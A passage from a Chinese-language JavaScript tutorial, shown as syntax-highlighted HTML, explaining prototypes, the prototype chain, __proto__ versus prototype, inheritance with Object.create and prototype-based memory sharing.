<span class="hljs-comment">// 但实际上，这1000个eat方法功能完全相同！</span>
<span class="hljs-comment">// 它们在内存中有1000个副本，这是巨大的浪费</span>
</code></pre>
<h4 data-id="heading-27">原型的核心思想：共享</h4>
<p>想象一个图书馆系统：</p>
<ul>
<li><strong>构造函数模式</strong>：每人都买一本相同的书（浪费钱和空间）</li>
<li><strong>原型模式</strong>：图书馆有一本书，大家都可以借阅（节约资源）</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 图书馆（原型）模式</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Library</span> = {
    <span class="hljs-comment">// 共享的书籍（方法）</span>
    <span class="hljs-attr">books</span>: {
        <span class="hljs-string">"吃的方法"</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">cat</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
        },
        <span class="hljs-string">"睡的方法"</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">cat</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
        }
    },
    
    <span class="hljs-comment">// 借阅方法</span>
    <span class="hljs-attr">borrow</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">bookName, cat</span>) {
        <span class="hljs-keyword">const</span> method = <span class="hljs-variable language_">this</span>.<span class="hljs-property">books</span>[bookName];
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-title function_">method</span>(cat);
        };
    }
};

<span class="hljs-comment">// 每个人（实例）不需要自己买书，只需记住借阅凭证</span>
<span class="hljs-keyword">const</span> cat1 = { <span class="hljs-attr">name</span>: <span class="hljs-string">"加菲猫"</span> };
<span class="hljs-keyword">const</span> cat2 = { <span class="hljs-attr">name</span>: <span class="hljs-string">"小白猫"</span> };

cat1.<span class="hljs-property">eat</span> = <span class="hljs-title class_">Library</span>.<span class="hljs-title function_">borrow</span>(<span class="hljs-string">"吃的方法"</span>, cat1);
cat2.<span class="hljs-property">eat</span> = <span class="hljs-title class_">Library</span>.<span class="hljs-title function_">borrow</span>(<span class="hljs-string">"吃的方法"</span>, cat2);

cat1.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// 加菲猫在吃东西</span>
cat2.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// 小白猫在吃东西</span>

<span class="hljs-comment">// 关键：两个eat方法都指向Library.books["吃的方法"]</span>
<span class="hljs-comment">// 但通过闭包绑定了各自的cat</span>
</code></pre>
<p>JavaScript的原型系统就是基于这种"共享"思想构建的，但实现更优雅。</p>
<h3 data-id="heading-28">4.2 原型（Prototype）的详细机制</h3>
<h4 data-id="heading-29">4.2.1 每个函数都有原型属性</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 每个函数创建时，都会自动获得一个prototype属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// "object"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// 一个空对象，但有constructor属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// prototype对象的内容</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-comment">// 输出大致如下：</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//     constructor: function Cat(name) {...},</span>
<span class="hljs-comment">//     __proto__: Object.prototype</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-30">4.2.2 实例与原型的关系</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 在原型上添加共享方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
};

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
};

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> garfield = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>);
<span class="hljs-keyword">const</span> doraemon = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"哆啦A梦"</span>);

<span class="hljs-comment">// 神奇的事情发生了！</span>
garfield.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "加菲猫在吃东西"</span>
doraemon.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "哆啦A梦在吃东西"</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(garfield.<span class="hljs-property">eat</span> === doraemon.<span class="hljs-property">eat</span>); <span class="hljs-comment">// true ✓</span>
<span class="hljs-comment">// 内存中只有一个eat函数，两个实例共享它！</span>
</code></pre>
<h4 data-id="heading-31">4.2.3 原型链的查找机制</h4>
<p>当访问一个对象的属性时，JavaScript引擎会：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 详细步骤演示</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span> = <span class="hljs-string">"猫"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃鱼"</span>);
};

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-comment">// 访问 cat.eat() 时发生的事情：</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 查找 cat.eat() 的过程 ==="</span>);

<span class="hljs-comment">// 第一步：检查cat自身是否有eat属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1. cat自身有eat吗？"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"eat"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 第二步：如果没有，查找cat.__proto__（即Cat.prototype）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"2. cat.__proto__有eat吗？"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"eat"</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 第三步：找到！执行Cat.prototype.eat，但this指向cat</span>
<span class="hljs-comment">// 相当于：Cat.prototype.eat.call(cat)</span>

<span class="hljs-comment">// 第四步：如果Cat.prototype也没有，继续查找Cat.prototype.__proto__（Object.prototype）</span>
<span class="hljs-comment">// 第五步：如果还没有，继续查找Object.prototype.__proto__（null）</span>
<span class="hljs-comment">// 第六步：找到null，返回undefined</span>

<span class="hljs-comment">// 可视化原型链：</span>
<span class="hljs-comment">// cat </span>
<span class="hljs-comment">//   → [[Prototype]]: Cat.prototype</span>
<span class="hljs-comment">//        → [[Prototype]]: Object.prototype</span>
<span class="hljs-comment">//             → [[Prototype]]: null</span>
</code></pre>
<h4 data-id="heading-32">4.2.4 <code>__proto__</code> vs <code>prototype</code> 的区别</h4>
<p>这是初学者最容易混淆的概念，让我们彻底搞清楚：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 关键区别 ==="</span>);

<span class="hljs-comment">// 1. prototype是函数的属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Cat有prototype吗？"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"prototype"</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat有prototype吗？"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"prototype"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 2. __proto__是对象的属性（每个对象都有）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat有__proto__吗？"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"__proto__"</span>)); <span class="hljs-comment">// false（但可以访问）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.__proto__存在吗？"</span>, cat.<span class="hljs-property">__proto__</span> !== <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 3. 重要关系：实例的__proto__指向构造函数的prototype</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.__proto__ === Cat.prototype?"</span>, cat.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 4. 构造函数的prototype的constructor指向构造函数本身</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Cat.prototype.constructor === Cat?"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 记忆口诀：</span>
<span class="hljs-comment">// - 函数（构造函数）有prototype（用于构建原型链）</span>
<span class="hljs-comment">// - 对象（实例）有__proto__（用于查找原型链）</span>
<span class="hljs-comment">// - 实例的__proto__指向构造函数的prototype</span>
</code></pre>
<h4 data-id="heading-33">4.2.5 原型链的可视化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 让我们画一个原型链的完整图</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-comment">// 设置原型链</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Cat</span>;

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>, <span class="hljs-string">"白色"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 完整的原型链 ==="</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat自身属性:"</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(cat)); <span class="hljs-comment">// ["name", "color"]</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.__proto__ === Cat.prototype?"</span>, cat.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Cat.prototype.__proto__ === Animal.prototype?"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Animal.prototype.__proto__ === Object.prototype?"</span>, <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Object.prototype.__proto__ === ?"</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>); <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 原型链：cat → Cat.prototype → Animal.prototype → Object.prototype → null</span>
</code></pre>
<h3 data-id="heading-34">4.3 原型模式的完整实现</h3>
<h4 data-id="heading-35">4.3.1 标准原型模式写法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 步骤1：定义构造函数（处理实例特有属性）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color, age</span>) {
    <span class="hljs-comment">// 实例特有属性放在构造函数中</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age || <span class="hljs-number">1</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createdAt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">// 每个实例创建时间不同</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">2</span>, <span class="hljs-number">9</span>); <span class="hljs-comment">// 每个实例唯一ID</span>
}

<span class="hljs-comment">// 步骤2：在原型上添加共享方法和属性</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-comment">// 重要：必须设置constructor，否则会丢失</span>
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>,
    
    <span class="hljs-comment">// 共享属性（所有猫都一样）</span>
    <span class="hljs-attr">species</span>: <span class="hljs-string">"猫科动物"</span>,
    <span class="hljs-attr">kingdom</span>: <span class="hljs-string">"动物界"</span>,
    <span class="hljs-attr">hasTail</span>: <span class="hljs-literal">true</span>,
    
    <span class="hljs-comment">// 共享方法（所有猫都一样）</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>(<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.color}</span>)在吃<span class="hljs-subst">${food}</span>`</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> += <span class="hljs-number">10</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 支持链式调用</span>
    },
    
    <span class="hljs-attr">sleep</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">hours</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>要睡<span class="hljs-subst">${hours}</span>小时`</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> += hours * <span class="hljs-number">5</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-attr">play</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>在玩毛线球`</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> -= <span class="hljs-number">5</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-attr">getInfo</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.color}</span>色，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>;
    },
    
    <span class="hljs-comment">// 计算属性</span>
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">isKitten</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> &lt; <span class="hljs-number">1</span>;
    },
    
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">energyLevel</span>() {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> &gt; <span class="hljs-number">80</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"精力充沛"</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> &gt; <span class="hljs-number">50</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"状态良好"</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> &gt; <span class="hljs-number">20</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"有点疲惫"</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"需要休息"</span>;
    }
};

<span class="hljs-comment">// 步骤3：添加原型属性（初始化值）</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">energy</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// 初始能量</span>

<span class="hljs-comment">// 步骤4：使用</span>
<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>, <span class="hljs-string">"黄色"</span>, <span class="hljs-number">5</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"小白猫"</span>, <span class="hljs-string">"白色"</span>, <span class="hljs-number">0.5</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-title function_">getInfo</span>()); <span class="hljs-comment">// "加菲猫，黄色色，5岁"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-title function_">getInfo</span>()); <span class="hljs-comment">// "小白猫，白色色，0.5岁"</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">isKitten</span>); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">isKitten</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 链式调用</span>
cat1.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"鱼"</span>).<span class="hljs-title function_">sleep</span>(<span class="hljs-number">8</span>).<span class="hljs-title function_">play</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">energyLevel</span>); <span class="hljs-comment">// "状态良好"</span>

<span class="hljs-comment">// 验证共享性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">eat</span> === cat2.<span class="hljs-property">eat</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span> === cat2.<span class="hljs-property">species</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-36">4.3.2 动态修改原型</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"第一批猫"</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"第二批猫"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 动态修改原型的效应 ==="</span>);

<span class="hljs-comment">// 1. 在创建实例后添加原型方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
};

<span class="hljs-comment">// 所有已存在的实例都能立即使用新方法！</span>
cat1.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第一批猫在吃东西"</span>
cat2.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第二批猫在吃东西"</span>

<span class="hljs-comment">// 2. 覆盖原型方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在大吃特吃！"</span>);
};

cat1.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第一批猫在大吃特吃！"</span>
cat2.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第二批猫在大吃特吃！"</span>

<span class="hljs-comment">// 3. 在原型上添加属性</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"</span>

<span class="hljs-comment">// 4. 重要：如果实例已有同名属性，会遮蔽原型属性</span>
cat1.<span class="hljs-property">species</span> = <span class="hljs-string">"超级猫"</span>; <span class="hljs-comment">// 在实例上创建属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span>); <span class="hljs-comment">// "超级猫"（实例属性优先）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"（还是原型属性）</span>

<span class="hljs-comment">// 5. 删除实例属性，恢复访问原型</span>
<span class="hljs-keyword">delete</span> cat1.<span class="hljs-property">species</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"（又访问到原型了）</span>

<span class="hljs-comment">// 6. 谨慎：修改内置原型</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sum</span>) {
    <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sum</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>);
    };
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">sum</span>()); <span class="hljs-comment">// 6</span>

<span class="hljs-comment">// 但注意：修改内置原型有风险，可能与其他库冲突</span>
</code></pre>
<h4 data-id="heading-37">4.3.3 原型的性能优势</h4>
<p>让我们用数据说话：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 性能测试：构造函数模式 vs 原型模式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">TestConstructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method1</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method2</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>(); };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method3</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-property">length</span>; };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method4</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>); };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method5</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>); };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">TestPrototype</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method1</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method2</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>(); };
